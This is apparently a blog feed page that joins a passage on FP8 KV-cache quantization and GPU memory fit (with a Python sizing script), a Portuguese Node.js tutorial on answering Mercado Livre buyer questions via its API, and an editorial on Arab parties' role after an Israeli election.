Model weights cache/token cache = weights at Llama-3.1-8B 15.0 GiB 128 KiB 122k tokens Qwen3-32B 61.1 GiB 256 KiB 250k tokens Llama-3.3-70B 131.5 GiB 320 KiB 431k tokens

Below its crossover, FP8 KV is buying room and nothing else. Above it, speed comes along for free. The 8B model crosses at 122k, which is why it is the one model in the set where quantization is a throughput strategy and not just a capacity strategy. The 70B crosses at 431k, which no deployment runs.

The case that actually decides it

Qwen3-32B at 128k on an 80 GiB H100 holds 0.59 sequences at BF16 KV. Two-thirds of a sequence. That is not a tight deployment, it is not a deployment: 61.1 GiB of weights plus 32 GiB of cache against 80 GiB of HBM.

At FP8 KV it holds 1.18. One session, with room for scratch buffers. The throughput gain there is 21%, which is not the point. The point is that the long-context configuration exists at all.

That is the real division of labor between KV quantization and everything else people try. You quantize to make a configuration fit. You get a small speed bonus as a side effect, rising with context, and you should never expect the speed bonus to justify the work.

What quantizing the cache cannot do

The batch you need to reach the ridge point barely moves: 295.6 to 295.4 on H100, for both precisions. That column is set by bytes per parameter, not by the cache. Solve the intensity equation and the cache term cancels out of the leading order.

Which means: quantizing the cache never makes a large model compute-bound. It puts more sequences in front of the same weight read, and the memory wall stays exactly where it was. And it never fixes a model that does not fit at all. Llama-3.3-70B on an 80 GiB H100 prints no fit at 4k, 32k and 128k, on BF16 and FP8 KV both, because HBM is 51 GiB short of the weights alone before a single token of context.

What it costs

Quantization error lands on the attention logits, and attention is where a small error gets amplified by a softmax over many keys. That is why long context degrades first: more keys compete, relative magnitudes matter more, and the error has more places to show up.

MLA makes this harder in a way worth naming. DeepSeek-V3's cache is a low-rank latent, 576 values per token per layer, 68.6 KiB at FP16, and that latent is already a lossy compression of full K and V. Quantizing it to 8 bits means stacking a second lossy step on the first, with the error budget the first step did not spend. There is also a compute cost that the byte ratio hides: MLA up-projects the latent at attention time, so at FP8 the up-projection reads quantized input, and you save bytes without saving the matmul.

I have no measurement for MLA at FP8, and I am not going to invent one. The mechanism says the error budget is thinner than for GQA, and the honest procedure is to measure at 64k before shipping, not to extrapolate from a 4k eval.

The script

Run it against your own configs. KV_BPP is the only line you change.

GiB = 1024**3 GPUS = { "H100 SXM 80GB": (80*GiB, 3.35e12, 989e12), "H200 SXM 141GB": (141*GiB, 4.80e12, 989e12), "B200 SXM 180GB": (180*GiB, 8.00e12, 2250e12), } # name: (params_b, layers, kv_heads, head_dim) MODELS = { "Llama-3.1-8B": (8.03, 32, 8, 128), "Qwen3-32B": (32.8, 64, 8, 128), "Llama-3.3-70B": (70.6, 80, 8, 128), } W_BPP = 2 # BF16 weights, unchanged either way KV_BPP = {"BF16 KV": 2, "FP8 KV": 1} gname = "H100 SXM 80GB" mem, bw, flops = GPUS[gname] ridge = flops / bw print(f"{gname}: {bw/1e12:.2f} TB/s, ridge {ridge:.0f} FLOP/byte\n") print(f"{'model':15s} {'ctx':>7s} {'KV':>8s} {'tok/s':>7s} {'seqs':>7s} {'ridge batch':>11s}") for mname, (p, layers, kvh, hd) in MODELS.items(): w = p * 1e9 * W_BPP for ctx in (4096, 32768, 131072): for kname, kbpp in KV_BPP.items(): kv = 2 * layers * kvh * hd * kbpp # cache bytes per token tps = bw / (w + ctx * kv) # single-stream ceiling room = (mem - w) / (ctx * kv) # sequences that fit in HBM fit = f"{room:7.2f}" if room > 0 else " no fit" need = ridge * w / (2 * p * 1e9 - ridge * kv) # batch at the ridge print(f"{mname:15s} {ctx:7d} {kname:>8s} {tps:7.1f} {fit} {need:11.1f}")

Perguntas do Mercado Livre via API: notificações, fila e resposta com /answers (Node.js)

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

Se você já integrou um sistema com o Mercado Livre, sabe que perguntas de compradores são um dos fluxos mais sensíveis ao tempo: quem pergunta normalmente está decidindo a compra naquele momento. Neste post vou mostrar como funciona o ciclo completo pela API oficial: receber a notificação de uma nova pergunta, buscar os detalhes, decidir a resposta e publicá-la. Tudo com base na documentação oficial em developers.mercadolivre.com.br, com exemplos em Node.js.

Aviso logo de cara: a AppVerix está construindo um produto em cima desse fluxo (o AppVerix Responde). Falo dele só no final. O resto do texto serve para qualquer pessoa que queira montar a própria integração.

Visão geral do fluxo

  1. Sua aplicação assina o tópico questions no gerenciador de aplicativos do Mercado Livre e informa uma callback URL.
  2. Quando chega uma pergunta, o Mercado Livre faz um POST na sua callback com um aviso curto: o recurso (/questions/ID), não a pergunta inteira.
  3. Você confirma o recebimento com HTTP 200 imediatamente e coloca o aviso numa fila.
  4. Um worker consulta GET /questions/$QUESTION_ID com o token do vendedor.
  5. O worker decide a resposta e chama POST /answers.

Vamos por partes.

1. Assinando o tópico questions

Segundo a página Receba notificações, os tópicos são configurados no gerenciador de aplicativos, onde você criou sua aplicação. Lá você informa a callback URL e marca os tópicos desejados. A lista inclui orders_v2, items, messages, questions e outros.

A autorização do vendedor é feita por OAuth: o vendedor autoriza sua aplicação e você recebe um access_token para chamar a API em nome dele. Nada de pedir senha.

2. O formato da notificação

A notificação é leve. Ela diz o que mudou e você busca o resto. Um exemplo no formato da documentação:

{ "resource": "/questions/5036111111", "user_id": 123456789, "topic": "questions", "application_id": 2069392825111111, "attempts": 1, "sent": "2026-11-01T12:00:00.000Z", "received": "2026-11-01T12:00:00.000Z" }

O campo importante é resource. O user_id indica de qual vendedor é a conta, o que importa se você atende várias lojas.

3. Responda 200 rápido e processe depois

Esta é a parte que mais derruba integração. A documentação é explícita:

  • O Mercado Livre envia um POST para a callback URL e espera um HTTP 200. Se não receber, considera a mensagem não entregue e tenta de novo.
  • As novas tentativas acontecem durante 1 hora. Depois disso, a notificação é descartada.
  • A recomendação é retornar HTTP 200 em até 500 milissegundos. Integrações que falham nisso podem ter os tópicos desativados.
  • Para volume alto, a própria documentação recomenda trabalhar com filas: confirmar na hora e só depois consultar a API.

Ou seja: nada de chamar a API, um LLM ou o banco de dados pesado dentro do handler do webhook. Um exemplo mínimo com Express:

import express from "express"; import { enqueue } from "./queue.js"; // Redis, SQS, tabela no Postgres... o que você já usa const app = express(); app.use(express.json()); app.post("/ml/notifications", (req, res) => { const n = req.body; res.sendStatus(200); // confirma primeiro if (n?.topic === "questions" && n?.resource) { enqueue({ resource: n.resource, userId: n.user_id, receivedAt: Date.now(), }).catch((err) => console.error("falha ao enfileirar", err)); } }); app.listen(3000);

Duas observações práticas:

  • Idempotência. Como há retentativas, o mesmo resource pode chegar mais de uma vez. Use o ID da pergunta como chave única na fila ou no banco.
  • Notificações perdidas. Se seu servidor ficou fora do ar, existe o endpoint GET /missed_feeds?app_id=$APP_ID, que lista notificações que não receberam 200 após a última tentativa. Segundo a documentação, ele só guarda notificações de até 2 dias atrás, então vale rodar uma rotina de reconciliação.
curl -X GET -H "Authorization: Bearer $ACCESS_TOKEN" \ "https://api.mercadolibre.com/missed_feeds?app_id=$APP_ID"

4. Buscando a pergunta

Com o resource em mãos, o worker consulta a pergunta. A documentação de Perguntas e Respostas mostra a chamada:

curl -X GET -H "Authorization: Bearer $ACCESS_TOKEN" \ https://api.mercadolibre.com/questions/3957150025

A resposta traz, entre outros campos, id, item_id, seller_id, text, status (UNANSWERED ou ANSWERED) e answer. A documentação também recomenda usar o parâmetro api_version=4 para receber a estrutura nova.

Em Node (18+, com fetch nativo):

const API = "https://api.mercadolibre.com"; async function getQuestion(resource, token) { const r = await fetch(`${API}${resource}?api_version=4`, { headers: { Authorization: `Bearer ${token}` }, }); if (!r.ok) throw new Error(`GET ${resource} -> ${r.status}`); return r.json(); }

Antes de responder, confira se status ainda é UNANSWERED. O vendedor pode ter respondido pelo app enquanto a mensagem estava na fila.

Para montar uma boa resposta, você normalmente vai precisar também dos dados do anúncio (item_id): título, atributos, garantia e assim por diante. Para listar perguntas de um anúncio, existe GET /questions/search?item=$ITEM_ID.

5. Publicando a resposta

A resposta é um POST /answers com o question_id e o text:

curl -X POST -H "Authorization: Bearer $ACCESS_TOKEN" \ -H "Content-Type: application/json" \ -d '{"question_id": 3957150025, "text": "Olá! Sim, enviamos com nota fiscal."}' \ https://api.mercadolibre.com/answers

Se der certo, o retorno mostra a pergunta com status: "ANSWERED" e answer.status: "ACTIVE". Em Node:

async function answer(questionId, text, token) { const r = await fetch(`${API}/answers`, { method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json", }, body: JSON.stringify({ question_id: questionId, text }), }); if (!r.ok) throw new Error(`POST /answers -> ${r.status} ${await r.text()}`); return r.json(); }

6. Juntando tudo no worker

async function handleJob(job) { const token = await getSellerToken(job.userId); // seu storage de OAuth (com refresh) const q = await getQuestion(job.resource, token); if (q.status !== "UNANSWERED") return; // já respondida const draft = await buildAnswer(q); // regras, templates ou IA if (!draft.confident) { await notifySeller(q); // deixa para um humano return; } await answer(q.id, draft.text, token); }

O ponto de design mais importante está em buildAnswer: o que fazer quando você não tem certeza. Responder errado no Mercado Livre é pior do que demorar alguns minutos. Na prática, vale ter:

  • Modo sugestão vs. automático. Comece só sugerindo respostas para o vendedor aprovar. Libere o automático depois, e por tipo de pergunta.
  • Respostas baseadas no anúncio. Use só fatos que estão no anúncio ou nas regras da loja (prazo, garantia, nota fiscal). Se a informação não existe, não invente.
  • Fallback humano. Pergunta ambígua, reclamação ou negociação vai para a pessoa.
  • Log de tudo. Guarde a pergunta, o contexto usado e a resposta enviada para revisar depois.

Checklist rápido

  • [ ] Tópico questions assinado e callback URL pública com HTTPS
  • [ ] Handler responde 200 antes de qualquer processamento (meta: < 500 ms)
  • [ ] Fila com deduplicação pelo ID da pergunta
  • [ ] Rotina de reconciliação com /missed_feeds (janela de 2 dias)
  • [ ] Revalidar status antes de POST /answers
  • [ ] Refresh do access_token funcionando
  • [ ] Caminho claro para "não sei, manda para o humano"

Editorial: Israel and the Arab parties

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

Do Israel’s ascendant Arab parties — the Joint List and Ra’am — hold the key to a more peaceful Middle East or will they sow the seeds of Israel’s destruction?

That’s one big question to emerge from Israel’s national election, the results of which were officially announced Friday, wherein an astounding 77.9% of eligible voters cast a ballot, a level of turnout of which America can only dream.

The result from the first election held since the Hamas-led attacks on Israel on Oct. 7, 2023, was, of course, complicated, as is often the case in a parliamentary system: The so-called pro-Netanyahu bloc or coalition — the group of parties broadly aligned with the current Israeli Prime Minister, Benjamin Netanyahu — won 53 seats, while the anti-Netanyahu bloc won 48, with the Arab group winning 19.

That was a reduction for the pro-Netanyahu bloc, which held 68 seats in the outgoing Knesset, but hardly a tidal wave of repudiation of President Donald Trump’s endorsee, given that Netanyahu leads the Likud party, which still won the highest number of votes.

Now the question arises as to who, if anyone, will form a governing coalition and what be the role therein of the Arab parties?

Before discussing that, we think it’s worth noting that a hefty chunk of our nation’s young “from the river to the sea” protesters are either oblivious to Israel’s 2.1 million Arabs (some 20% of the country’s population) or prefer not to talk about them since it complicates the colonialist binary they prefer. But Israel, of course, is a multiracial democracy (some prefer the term “preferential democracy”). Arab citizens have a vote, and they turned out in droves and used it.

“They’re the kingmakers,” said the journalist Christiane Amanpour on X.

But are they? The question is whether or not those who want to form a government are willing to join with the Arab parties to do so.

At one extreme, you have voices like that of Yair Netanyahu, the son of the prime minister and a chip off the old block.

“These elections proved that the greatest danger to the survival of the State of Israel, aside from the Iranian nuclear program, is what is called ‘Israeli Arabs,'” the younger Netanyahu said Friday on X. “A country cannot survive long-term when 20% of its population identifies with its enemies and wants its destruction,” he added, while going on to essentially argue that Muslims cannot, and can never, live peacefully with “infidels” as their neighbors.

Joint List faction chairman Ahmad Tibi did not care for that comment, of course. And a group of prominent Israelis put out an open petition saying: “The desire of the vast majority of Israel’s Arab citizens, as expressed in their voting patterns, to participate in the parliamentary process and to play a full and equal role in the affairs of the state, is of the utmost importance and must not be ignored. It is essential to the future of democracy and the fabric of Israeli society, as well as to the Israeli-Palestinian conflict.”

So there is the nub of the matter.

Looking from far-off Chicago, you’d think the solution was simple: One of the blocs, and one is more likely than the other, agrees to work with the Arab parties in exchange for a commitment that said parties support the existence of Israel as a democracy and its right to defend itself. Surely, any nation has the right to ask members of a nation’s governing body to commit to that. Otherwise, said party is just a cancer operating from within.

If that was secured, then full Arab participation in Israeli democracy would surely be a basis for future agreements, treaties and productive changes in the entire region. And it surely would help defang the protesters and antisemites who refuse to see Israel in those terms.

But of course it’s not that simple; the issue actually is a microcosm of the whole intractable Middle East problem. As longtime journalist Dan Perry wrote in an opinion piece for The Jerusalem Post on Friday: “the opposition should stop overthinking, get out of its own way, thank the Arabs for their support, and get on with saving the country.”

We could not agree more. Although we’d add that the Arab parties also should acknowledge the skepticism of some Israelis and commit, right now, to saying things that might make that more likely.
